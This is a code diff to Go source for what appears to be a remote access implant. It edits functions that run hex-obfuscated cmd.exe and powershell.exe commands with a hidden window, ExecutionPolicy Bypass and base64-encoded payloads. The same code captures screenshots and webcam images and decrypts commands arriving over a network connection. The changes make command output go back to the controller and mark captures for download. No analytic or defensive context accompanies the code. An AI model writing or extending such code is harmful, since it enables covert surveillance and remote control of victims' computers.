@@ -528,8 +528,7 @@ func GetImageFromClipboard() (image.Image, error) {
 }
 
 func RunCommand(command string, payload string, isFile bool) (string, error) {
-	command = strings.TrimSpace(command)
-	if command == "" {
+	if strings.TrimSpace(command) == "" {
 		return "", errors.New("no command provided")
 	}
 	if command != "cmd" && command != "ps" {
@@ -543,13 +542,13 @@ func RunCommand(command string, payload string, isFile bool) (string, error) {
 			return "", errors.New("invalid characters in payload")
 		}
 		args = []string{"/c", payload}
-		command = "\x63\x6d\x64\x2e\x65\x78\x65"
+		command = "\x63\x6d\x64\x2e\x65\x78\x65" // "cmd.exe"
 	case "ps":
 		args = []string{
 			"-NonInteractive",
 			"-NoLogo",
 			"-NoProfile",
-			"-WindowStyle", "hidden",
+			"-WindowStyle", "Hidden",
 			"-ExecutionPolicy", "Bypass",
 		}
 		if isFile {
@@ -558,7 +557,7 @@ func RunCommand(command string, payload string, isFile bool) (string, error) {
 			encodedCmd := base64.StdEncoding.EncodeToString(utf8To16(payload))
 			args = append(args, "-EncodedCommand", encodedCmd)
 		}
-		command = "\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65"
+		command = "\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65" // "powershell.exe"
 	}
 
 	cmd := exec.Command(command, args...)
@@ -570,7 +569,7 @@ func RunCommand(command string, payload string, isFile bool) (string, error) {
 
 	err := cmd.Start()
 	if err != nil {
-		WriteLog("failed to execute command: %s", err.Error())
+		WriteLog("Failed to start command: %s", err.Error())
 		return "", err
 	}
 
@@ -582,14 +581,17 @@ func RunCommand(command string, payload string, isFile bool) (string, error) {
 	select {
 	case <-time.After(30 * time.Second):
 		if err := cmd.Process.Kill(); err != nil {
+			WriteLog("Failed to kill process: %v", err)
 			return "", fmt.Errorf("failed to kill process: %v", err)
 		}
 		return "", errors.New("command timed out")
 	case err := <-done:
 		if err != nil {
+			WriteLog("Command failed: %v. Error output: %s", err, stderr.String())
 			return "", fmt.Errorf("command failed: %v. Error output: %s", err, stderr.String())
 		}
 	}
+
 	return stdout.String(), nil
 }
 
@@ -622,7 +624,15 @@ func ParseAction(action string) error {
 				return fmt.Errorf("error decoding base64: %v", err)
 			}
 			payload := string(payloadBytes)
-			RunCommand(command, payload, false)
+			result, err := RunCommand(command, payload, false)
+			if err != nil {
+				return fmt.Errorf("error in RunCommand: %v", err)
+			}
+			SendCommand(map[string]interface{}{
+				"response": map[string]interface{}{
+					"data": result,
+				},
+			})
 		}
 	case "up":
 		SendCommand(map[string]interface{}{
@@ -646,7 +656,7 @@ func ParseAction(action string) error {
 		SendCommand(map[string]interface{}{
 			"response": map[string]interface{}{
 				"data":     result,
-				"filename": FormatFileName("ss", "png"),
+				"download": FormatFileName("ss", "png"),
 			},
 		})
 		return nil
@@ -658,7 +668,7 @@ func ParseAction(action string) error {
 		SendCommand(map[string]interface{}{
 			"response": map[string]interface{}{
 				"data":     img,
-				"filename": FormatFileName("wc", "png"),
+				"download": FormatFileName("wc", "png"),
 			},
 		})
 		return nil
@@ -672,7 +682,6 @@ func HandleConnection(conn net.Conn) {
 	defer conn.Close() // Ensure the connection is closed when done
 
 	reader := bufio.NewReader(conn)
-	var buffer bytes.Buffer
 
 	for {
 		if exitProcess {
@@ -700,20 +709,13 @@ func HandleConnection(conn net.Conn) {
 
 		if n > 0 {
 			WriteLog("Received data: %s", string(chunk[:n])) // Log received chunk for debugging
-			buffer.Write(chunk[:n])
-
-			for {
-				// Extract the data
-				data := buffer.Bytes()
-				if len(data) > 0 {
-					action, err := DecryptData(string(data), sessionId)
-					WriteLog("Decrypted Data: %s", action)
-					if err != nil {
-						WriteLog("DecryptData error: %v", err)
-					} else if action != "" {
-						if err := ParseAction(action); err != nil {
-							WriteLog("Error parsing action: %v", err)
-						}
+			if len(chunk[:n]) > 0 {
+				action, err := DecryptData(string(chunk[:n]), sessionId)
+				if err != nil {
+					WriteLog("DecryptData error: %v", err)
+				} else if action != "" {
+					if err := ParseAction(action); err != nil {
+						WriteLog("Error parsing action: %v", err)
 					}
 				}
 			}
